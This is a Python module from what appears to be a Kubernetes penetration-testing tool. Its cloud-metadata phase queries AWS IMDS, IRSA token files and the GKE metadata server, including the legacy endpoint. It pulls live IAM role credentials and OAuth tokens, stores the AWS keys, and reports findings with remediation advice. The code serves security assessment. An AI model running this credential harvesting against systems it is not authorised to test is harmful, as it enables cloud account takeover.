"""Cloud engine."""

from __future__ import annotations

import json
import urllib.request

from kubexhunt.core.legacy import load_legacy_module
from kubexhunt.engines.base import LegacyFunctionEngine


def run_phase_cloud_metadata(legacy) -> None:
    """Execute the extracted cloud metadata and IAM credential phase."""

    legacy.CURRENT_PHASE = legacy.STATE.current_phase = "2"
    legacy.phase_header(
        "2",
        "Cloud Metadata & IAM Credentials",
        "IMDS credential theft, GKE metadata, OAuth token exfiltration",
    )

    cloud = legacy.CTX.get("cloud", "Unknown")

    if cloud == "AWS":
        legacy.section("AWS IMDSv1")
        code, body = legacy.http_get("http://169.254.169.254/latest/meta-data/", timeout=3)
        if code == 200:
            legacy.finding(
                "CRITICAL",
                "IMDSv1 accessible — no auth required",
                "Any process can steal IAM creds without a session token",
                "Set HttpTokens=required (IMDSv2 only) on all EC2 instances",
            )
            legacy.add_attack_edge("Compromised Pod", "AWS IAM Role", "IMDSv1 → no-auth credential theft", "CRITICAL")
        else:
            legacy.finding("PASS", "IMDSv1 blocked", "IMDSv2 required")

        legacy.section("AWS IMDSv2 Credential Theft")
        imds_token = ""
        try:
            request = urllib.request.Request(
                "http://169.254.169.254/latest/api/token",
                data=b"",
                headers={
                    "X-aws-ec2-metadata-token-ttl-seconds": "21600",
                    "User-Agent": legacy._get_ua(),
                },
                method="PUT",
            )
            with urllib.request.urlopen(request, timeout=3) as response:
                imds_token = response.read().decode().strip()
        except Exception:
            pass

        if imds_token:
            code, role_body = legacy.http_get(
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                headers={"X-aws-ec2-metadata-token": imds_token},
                timeout=3,
            )
            role_name = role_body.strip() if code == 200 else ""
            if role_name:
                code2, creds_body = legacy.http_get(
                    f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}",
                    headers={"X-aws-ec2-metadata-token": imds_token},
                    timeout=3,
                )
                try:
                    creds = json.loads(creds_body)
                    key_id = creds.get("AccessKeyId", "")[:16] + "..."
                    expiration = creds.get("Expiration", "unknown")
                    legacy.finding(
                        "CRITICAL",
                        "AWS IAM credentials stolen via IMDSv2",
                        f"Role: {role_name} | KeyId: {key_id} | Expires: {expiration}\n"
                        f"export AWS_ACCESS_KEY_ID={creds.get('AccessKeyId', '')} "
                        "AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...",
                        "Block 169.254.169.254/32 via NetworkPolicy",
                    )
                    legacy.add_attack_edge(
                        "AWS IAM Role",
                        "Cloud Account Compromise",
                        f"Role {role_name} → aws sts get-caller-identity",
                        "CRITICAL",
                    )
                    legacy.CTX["aws_creds"] = creds
                except (TypeError, ValueError, json.JSONDecodeError):
                    legacy.finding("HIGH", "IMDS reachable, role found but parse failed", f"Role: {role_name}")

                code3, instance_identity = legacy.http_get(
                    "http://169.254.169.254/latest/dynamic/instance-identity/document",
                    headers={"X-aws-ec2-metadata-token": imds_token},
                    timeout=3,
                )
                try:
                    document = json.loads(instance_identity)
                    legacy.CTX["aws_account"] = document.get("accountId", "")
                    legacy.CTX["aws_region"] = document.get("region", "")
                    legacy.info_line(
                        f"Account: {document.get('accountId')} | Region: {document.get('region')} | Instance: {document.get('instanceId')}"
                    )
                except (TypeError, ValueError, json.JSONDecodeError):
                    pass
            else:
                legacy.finding("MEDIUM", "IMDSv2 reachable but no IAM role attached", "")
        else:
            legacy.finding("PASS", "IMDS not reachable", "NetworkPolicy blocking 169.254.169.254")

        legacy.section("AWS IRSA")
        role_arn = legacy.os.environ.get("AWS_ROLE_ARN", "")
        token_file = legacy.os.environ.get("AWS_WEB_IDENTITY_TOKEN_FILE", "")
        if role_arn and token_file:
            token_content = legacy.file_read(token_file)
            if token_content:
                jwt = legacy.decode_jwt(token_content.strip())
                legacy.finding(
                    "HIGH",
                    "IRSA token present — pod-level AWS IAM access",
                    f"Role ARN: {role_arn}\n"
                    f"SA: {jwt.get('kubernetes.io/serviceaccount/service-account.name', '?')}\n"
                    "aws sts assume-role-with-web-identity --role-arn ...",
                    "Scope IRSA role policy to minimum required permissions",
                )
                legacy.add_attack_edge("Compromised Pod", "AWS IAM Role", f"IRSA token → {role_arn}", "HIGH")
        else:
            legacy.finding("PASS", "No IRSA token", "AWS_ROLE_ARN not set")

    elif cloud == "GKE":
        legacy.section("GKE Metadata Server")
        code, body = legacy.http_get(
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            headers={"Metadata-Flavor": "Google"},
            timeout=3,
        )
        if code == 200:
            try:
                token_data = json.loads(body)
                legacy.finding(
                    "CRITICAL",
                    "GKE OAuth2 token via metadata server",
                    f"Type: {token_data.get('token_type')} | Expires: {token_data.get('expires_in')}s",
                    "Enable Workload Identity | disable node SA for pods",
                )
                legacy.add_attack_edge("Compromised Pod", "GCP Account", "GKE metadata OAuth token", "CRITICAL")
            except (TypeError, ValueError, json.JSONDecodeError):
                legacy.finding("HIGH", "GKE metadata accessible, token parse failed", "")
        else:
            legacy.finding("PASS", "GKE metadata token not accessible", f"HTTP {code}")

        legacy.section("GKE Node SA Scopes")
        code, scopes_body = legacy.http_get(
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes",
            headers={"Metadata-Flavor": "Google"},
            timeout=3,
        )
        if code == 200:
            scopes = scopes_body.strip().split("\n")
            dangerous = [scope for scope in scopes if "cloud-platform" in scope or "devstorage.read_write" in scope]
            if dangerous:
                legacy.finding(
                    "CRITICAL",
                    "Dangerous GCP scopes on node SA",
                    f"Scopes: {', '.join(dangerous[:3])}\ncloud-platform = full GCP API access",
                    "Use Workload Identity instead of node SA scopes",
                )
            else:
                legacy.finding(
                    "MEDIUM",
                    "GKE node has GCP scopes (limited)",
                    f"Scopes: {', '.join(scopes[:3])}",
                    "Consider Workload Identity",
                )

        legacy.section("GKE Legacy Metadata")
        code, _ = legacy.http_get(
            "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token",
            timeout=3,
        )
        if code == 200:
            legacy.finding(
                "CRITICAL",
                "Legacy GKE metadata accessible without Metadata-Flavor header",
                "Old GKE clusters expose tokens without auth header",
                "Upgrade GKE cluster or enable metadata concealment",
            )
        else:
            legacy.finding("PASS", "Legacy GKE endpoint blocked", f"HTTP {code}")

    else:
        legacy.finding("INFO", f"Cloud: {cloud} — IMDS checks skipped for this provider", "")


class CloudMetadataEngine(LegacyFunctionEngine):
    """Cloud metadata engine."""

    def __init__(self) -> None:
        super().__init__(name="cloud", phase="2", function_name="phase_cloud_metadata")

    async def run(self, _context, _config, _state, _api_client):
        """Execute the extracted cloud phase via the legacy compatibility layer."""

        legacy = load_legacy_module()
        return run_phase_cloud_metadata(legacy)
